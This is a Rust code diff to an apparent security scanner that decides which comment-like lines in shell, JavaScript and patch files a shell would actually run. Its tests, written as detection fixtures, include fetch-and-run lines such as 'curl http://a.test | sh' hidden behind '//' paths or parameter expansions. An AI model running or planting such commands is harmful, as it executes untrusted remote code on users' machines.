@@ -10,6 +10,7 @@
 //! Masking only ever blanks characters, never line breaks, so masked lines
 //! stay aligned with `str::lines` of the original text.
 
+use std::collections::HashSet;
 use std::path::Path;
 
 /// One line as the local rules see it.
@@ -166,10 +167,27 @@ fn is_full_line_comment(language: Language, line: &str) -> bool {
     let line = line.trim_start();
     match language {
         Language::Shell { .. } | Language::Hash => line.starts_with('#'),
-        Language::Slash => line.starts_with("//"),
+        Language::Slash => line.starts_with("//") && !is_a_path(line),
         Language::Lua => line.starts_with("--"),
         Language::Patch | Language::Other => false,
     }
+}
+
+/// Whether a line that starts with `//` reads as a path (`//usr/bin/curl
+/// …`): a shell handed the file runs it as a command, whatever the file is
+/// called, so it is not passed over as a comment.
+fn is_a_path(line: &str) -> bool {
+    line.trim_start()
+        .strip_prefix("//")
+        // Directly after the slashes: `// see src/x.rs` is a comment, and
+        // so is an address.
+        .filter(|rest| {
+            rest.starts_with(|character: char| {
+                character.is_ascii_alphanumeric() || matches!(character, '.' | '$' | '~')
+            })
+        })
+        .and_then(|rest| rest.split_whitespace().next())
+        .is_some_and(|word| word.contains('/') && !word.contains("://"))
 }
 
 fn blank(line: &str) -> String {
@@ -186,17 +204,29 @@ fn block_comments(
     open: &str,
     close: &str,
 ) -> String {
+    let expands = |text: &str| text.contains("${") || text.contains('`');
     let (skipped, rest) = if *in_block {
+        if expands(line) {
+            *in_block = !line.contains(close);
+            return line.to_string();
+        }
         (0, line)
     } else {
         let trimmed = line.trim_start();
         let indent = line.len() - trimmed.len();
-        if trimmed.starts_with(single) {
+        if trimmed.starts_with(single) && !(single == "//" && is_a_path(trimmed)) {
             return blank(line);
         }
         let Some(after_open) = trimmed.strip_prefix(open) else {
             return line.to_string();
         };
+        // Inside a template string, `/* ${code} */` is text with code in
+        // it, not a comment: one that holds an expansion stays visible.
+        // The comment still runs on: its other lines are passed over.
+        if expands(after_open) {
+            *in_block = !after_open.contains(close);
+            return line.to_string();
+        }
         *in_block = true;
         (indent + open.len(), after_open)
     };
@@ -338,7 +368,13 @@ fn output_may_run(text: &str) -> bool {
         {
             return false;
         }
+        // The start of the command is enough, however long its line is.
         let command = &text[index + 1..];
+        let mut limit = command.len().min(256);
+        while !command.is_char_boundary(limit) {
+            limit -= 1;
+        }
+        let command = &command[..limit];
         let command = &command[..command.find('\n').unwrap_or(command.len())];
         let program = command
             .split(|character: char| {
@@ -353,17 +389,173 @@ fn output_may_run(text: &str) -> bool {
             })
             .unwrap_or_default();
         let program = program.trim_matches(['"', '\'']);
-        INTERPRETERS.contains(&program.rsplit('/').next().unwrap_or_default())
+        let program = program.rsplit('/').next().unwrap_or_default();
+        INTERPRETERS.contains(&program)
     });
 
     let redirects_output = text.contains(">(")
         || text.lines().any(|line| {
             let line = line.trim_start();
-            line.strip_prefix("exec")
-                .is_some_and(|rest| rest.trim_start().starts_with(['>', '1', '2', '&']))
+            line.strip_prefix("exec").is_some_and(|rest| {
+                rest.trim_start()
+                    .starts_with(|character: char| character.is_ascii_digit() || matches!(character, '>' | '&'))
+            })
+        })
+        // What a command prints, run in place.
+        || text.lines().any(|line| {
+            let substitutes = line.contains("$(") || line.contains('`');
+            (substitutes
+                && ["eval ", "sh -c", "bash -c", "zsh -c"]
+                    .iter()
+                    .any(|runner| line.contains(runner)))
+                || line.contains("source <(")
+                || line.contains(". <(")
         });
 
-    redefined || pipes_into_interpreter || redirects_output
+    redefined || pipes_into_interpreter || redirects_output || writes_a_file(text)
+}
+
+/// A file kept to be read, not run: `build.log`, `usage.txt`.
+fn is_a_record(target: &str) -> bool {
+    let word = target
+        .split(|character: char| character.is_whitespace() || matches!(character, ';' | '&' | '|'))
+        .next()
+        .unwrap_or_default()
+        .trim_matches(['"', '\'']);
+    Path::new(word).extension().is_some_and(|extension| {
+        extension.eq_ignore_ascii_case("log") || extension.eq_ignore_ascii_case("txt")
+    })
+}
+
+/// Where on `line` output is last sent to a file: by a redirection, or
+/// through `tee` or `dd`. Output to the terminal's own streams or to
+/// nowhere does not count.
+fn last_write(line: &str) -> Option<usize> {
+    let bytes = line.as_bytes();
+    let mut last = None;
+    for (at, byte) in bytes.iter().enumerate() {
+        match byte {
+            // The first of a run: `>>` and `>|` are one redirection.
+            b'>' if at == 0 || bytes[at - 1] != b'>' => {
+                let head = String::from_utf8_lossy(&bytes[at + 1..bytes.len().min(at + 65)]);
+                let target = head.trim_start_matches(['>', '|', ' ', '\t']);
+                let before = &line[..at];
+                if !(target.starts_with('&')
+                    || target.starts_with("/dev/null")
+                    || target.starts_with("/dev/stderr")
+                    || target.starts_with("/dev/tty")
+                    || is_a_record(target)
+                    || before.ends_with('-')
+                    || before.ends_with('='))
+                {
+                    last = Some(at);
+                }
+            }
+            b'|' => {
+                // The command's first words, however long the line is.
+                let head = &bytes[at + 1..bytes.len().min(at + 65)];
+                let head = String::from_utf8_lossy(head);
+                let program = head
+                    .trim_start_matches('&')
+                    .split_whitespace()
+                    .find(|word| !matches!(*word, "sudo" | "doas" | "command" | "env"))
+                    .unwrap_or_default();
+                // Every file it writes is a record, or it counts.
+                let mut targets = head
+                    .split_whitespace()
+                    .skip_while(|word| *word != program)
+                    .skip(1)
+                    .take_while(|word| !word.starts_with([';', '|', '&', '>']))
+                    .filter(|word| !word.starts_with('-'))
+                    .peekable();
+                if matches!(program.rsplit('/').next(), Some("tee" | "dd"))
+                    && !(targets.peek().is_some() && targets.all(is_a_record))
+                {
+                    last = Some(at);
+                }
+            }
+            _ => {}
+        }
+    }
+    last
+}
+
+/// Whether what a function, a loop or a group prints is written to a file
+/// (`gen > t.sh`, `done > t.sh`, `gen | tee t.sh`) or substituted
+/// (`$(gen)`): it may be run next, so the printed text is code like any
+/// other. Each line is read once, left to right.
+fn writes_a_file(text: &str) -> bool {
+    let functions: HashSet<&str> = text
+        .lines()
+        .filter_map(|line| {
+            let line = line.trim_start();
+            let name = line
+                .strip_prefix("function ")
+                .map_or(line, str::trim_start)
+                .split(|character: char| {
+                    !(character.is_alphanumeric() || matches!(character, '_' | '-' | '.' | ':'))
+                })
+                .next()?;
+            let after = line[line.find(name)? + name.len()..].trim_start();
+            (!name.is_empty() && (after.starts_with("()") || line.starts_with("function ")))
+                .then_some(name)
+        })
+        .collect();
+    text.lines().any(|line| {
+        let line = line.trim();
+        let last = last_write(line);
+        // The end of a compound command, with its output sent somewhere.
+        let compound = last.is_some_and(|last| {
+            ["done", "fi", "esac", "}", ")"].iter().any(|end| {
+                line.match_indices(end).any(|(at, _)| {
+                    let after = at + end.len();
+                    (at == 0 || line[..at].ends_with([' ', '\t', ';']))
+                        && after <= last
+                        && line[after..].trim_start().starts_with(['>', '|'])
+                })
+            })
+        });
+        if compound || functions.is_empty() {
+            return compound;
+        }
+        // A call of one of the file's own functions whose output goes to
+        // a file, there or further along the line, or is substituted.
+        let bytes = line.as_bytes();
+        let breaks = |byte: u8| matches!(byte, b';' | b'|' | b'&' | b'(' | b'`');
+        let mut start = 0;
+        while start <= bytes.len() {
+            let mut from = start;
+            while bytes
+                .get(from)
+                .is_some_and(|byte| matches!(byte, b' ' | b'\t'))
+            {
+                from += 1;
+            }
+            let mut to = from;
+            while bytes
+                .get(to)
+                .is_some_and(|byte| !(breaks(*byte) || matches!(byte, b' ' | b'\t' | b'>' | b')')))
+            {
+                to += 1;
+            }
+            let substituted = start > 0
+                && (bytes[start - 1] == b'`'
+                    || (bytes[start - 1] == b'(' && start >= 2 && bytes[start - 2] == b'$'));
+            if to > from
+                && functions.contains(&line[from..to])
+                && (substituted || last.is_some_and(|last| last >= to))
+            {
+                return true;
+            }
+            // On to what follows the next break.
+            let mut next = to;
+            while bytes.get(next).is_some_and(|byte| !breaks(*byte)) {
+                next += 1;
+            }
+            start = next + 1;
+        }
+        false
+    })
 }
 
 /// A small shell lexer: quotes, `$(...)`, backticks, comments, heredocs and
@@ -442,6 +634,9 @@ impl Shell<'_> {
         let mut statement = Statement::at(0);
         let mut heredocs: Vec<Heredoc> = Vec::new();
         let mut index = 0;
+        // How many `${` are open: a `#` in a parameter expansion is part
+        // of it (`${x:= #}`), never a comment.
+        let mut expansions = 0_usize;
 
         while index < self.chars.len() {
             let character = self.chars[index];
@@ -493,6 +688,19 @@ impl Shell<'_> {
             }
 
             let arithmetic = top == Some(Context::Arithmetic);
+            // An expansion does not run past its line: what follows a
+            // line that left one open is read afresh.
+            if character == '\n' {
+                expansions = 0;
+            } else if character == '$' && next == '{' {
+                expansions += 1;
+                index += 2;
+                continue;
+            } else if character == '}' && expansions > 0 {
+                expansions -= 1;
+                index += 1;
+                continue;
+            }
             match character {
                 '\\' => index += 1,
                 '\'' => stack.push(Context::Single),
@@ -501,6 +709,7 @@ impl Shell<'_> {
                     stack.push(Context::AnsiC);
                     index += 1;
                 }
+
                 '$' | '(' if (character == '(' || next == '(') => {
                     statement.consumed = true;
                     // A plain `(` opens an array or a subshell; `$(` runs a
@@ -532,7 +741,7 @@ impl Shell<'_> {
                         stack.push(Context::Backtick);
                     }
                 }
-                '#' if !arithmetic && self.is_word_start(index) => {
+                '#' if !arithmetic && expansions == 0 && self.is_word_start(index) => {
                     let end = self.line_end(index);
                     self.blank_both(index, end);
                     index = end;
@@ -770,7 +979,16 @@ impl Shell<'_> {
                             })
                     })
             });
-            if declared {
+            // Only the assignment by itself: `url=x curl …` is a command
+            // run with `url` in its environment (an array cannot be one).
+            let text: String = self.chars[statement.start..end.min(self.chars.len())]
+                .iter()
+                .collect();
+            let array = text
+                .split_once('=')
+                .is_some_and(|(_, value)| value.starts_with('('));
+            let alone = array || self.words(statement.start, end).len() == 1;
+            if declared && alone {
                 let start = self
                     .words(statement.start, end)
                     .first()
@@ -1015,5 +1233,116 @@ mod tests {
             code("run", "#!/usr/bin/node\n# x\n"),
             ["#!/usr/bin/node", "# x"]
         );
+    }
+
+    #[test]
+    fn comments_stay_comments_and_own_output_is_followed() {
+        // A comment that names a path or an address is still a comment.
+        assert_eq!(
+            code("a.js", "// http://a.test/docs\n// src/main.rs runs sudo\n"),
+            ["", ""]
+        );
+        // The other lines of a block comment are passed over even when
+        // its first one stays visible.
+        let block = code("a.js", "/* uses `x` here\n * never run sudo\n */\nrun();\n");
+        assert!(block[0].contains("uses"));
+        assert_eq!(block[1..], ["", "", "run();"]);
+        // What one of the file's own functions prints, kept or run.
+        for rest in [
+            "gen | tee t.sh\n",
+            "gen | cat > t.sh\n",
+            "for i in 1; do gen; done | tee t.sh\n",
+            "exec 3>t.sh\ngen >&3\n",
+            "x=$(gen); echo \"$x\" > t.sh\n",
+            "eval \"$(gen)\"\n",
+            "source <(gen)\n",
+            "gen|tee t.sh\n",
+            "gen&>t.sh\n",
+            "true&&gen | sudo tee t.sh\n",
+            "gen | tee a.log b.sh\n",
+            "x=`gen`; sh -c \"$x\"\n",
+        ] {
+            let text = format!("gen() {{\n  echo 'sudo a'\n}}\n{rest}");
+            assert!(quiet("x.sh", &text).join("\n").contains("sudo a"), "{rest}");
+        }
+        // Many functions and many lines are read in one pass.
+        let mut long: String = (0..20_000)
+            .map(|index| format!("f{index}() {{ echo a; }}\n"))
+            .collect::<Vec<_>>()
+            .concat();
+        long.push_str(&"echo b\n".repeat(20_000));
+        // And one line of very many statements.
+        long.push_str(&"f1;".repeat(100_000));
+        long.push('\n');
+        long.push_str(&"f1|".repeat(100_000));
+        long.push('\n');
+        long.push_str(&">".repeat(100_000));
+        long.push_str("&2\n");
+        long.push_str(&"> ".repeat(100_000));
+        long.push('\n');
+        long.push_str(&">|".repeat(100_000));
+        long.push('\n');
+        let started = std::time::Instant::now();
+        assert_eq!(lines("x.sh", &long).len(), 40_005);
+        // Output kept as a log or a text is not a script to run.
+        for rest in ["gen \"$@\" 2>&1 | tee build.log\n", "gen > usage.txt\n"] {
+            let text = format!("gen() {{\n  echo 'sudo a'\n}}\n{rest}");
+            assert!(
+                !quiet("x.sh", &text).join("\n").contains("sudo a"),
+                "{rest}"
+            );
+        }
+        assert!(started.elapsed().as_secs() < 30);
+        // An address or a path after `//` with something before it.
+        assert_eq!(code("a.js", "//https://a.test/x | sh\n"), [""]);
+        assert!(code("a.js", "//$HOME/bin/curl http://a.test | sh\n")[0].contains("curl"));
+    }
+
+    #[test]
+    fn what_a_shell_runs_is_not_passed_over_as_a_comment_or_a_message() {
+        // A `#` inside a parameter expansion starts no comment.
+        assert_eq!(
+            code(
+                "x.sh",
+                ": ${x:= #}; curl http://a.test | sh\necho ${#y} # note\n"
+            ),
+            [": ${x:= #}; curl http://a.test | sh", "echo ${#y}"]
+        );
+        // A line of `//` that reads as a path is a command to a shell.
+        assert_eq!(
+            code(
+                "build.js",
+                "//usr/bin/curl http://a.test | sh\n// a note\n//TODO later\n"
+            ),
+            ["//usr/bin/curl http://a.test | sh", "", ""]
+        );
+        let patch = "+++ b/build.c\n+//usr/bin/curl http://a.test | sh\n+// a note\n";
+        assert!(code("fix.patch", patch)[1].contains("curl"));
+        assert!(code("fix.patch", patch)[2].trim().is_empty());
+        // A block comment with an expansion in it may be template text.
+        assert!(code("a.js", "/* ${run()} */\n")[0].contains("run()"));
+        // `url=x command` runs the command.
+        assert!(quiet("PKGBUILD", "url=x curl http://a.test/p\n")[0].contains("curl"));
+        // What a function or a loop prints into a file may be run next.
+        for text in [
+            "gen() {\n  echo 'sudo a'\n}\ngen > t.sh\nsh t.sh\n",
+            "for i in 1; do echo 'sudo a'; done > t.sh\n",
+            "{ echo 'sudo a'; } >> t.sh\n",
+        ] {
+            assert!(
+                quiet("x.sh", text).join("\n").contains("sudo a"),
+                "{text:?}"
+            );
+        }
+        // To the terminal or to nowhere it stays a message.
+        for text in [
+            "warn() {\n  echo 'sudo a'\n}\nwarn >&2\n",
+            "for i in 1; do echo 'sudo a'; done >/dev/null\n",
+        ] {
+            assert!(
+                !quiet("x.sh", text).join("\n").contains("sudo a"),
+                "{text:?}"
+            );
+        }
     }
 }
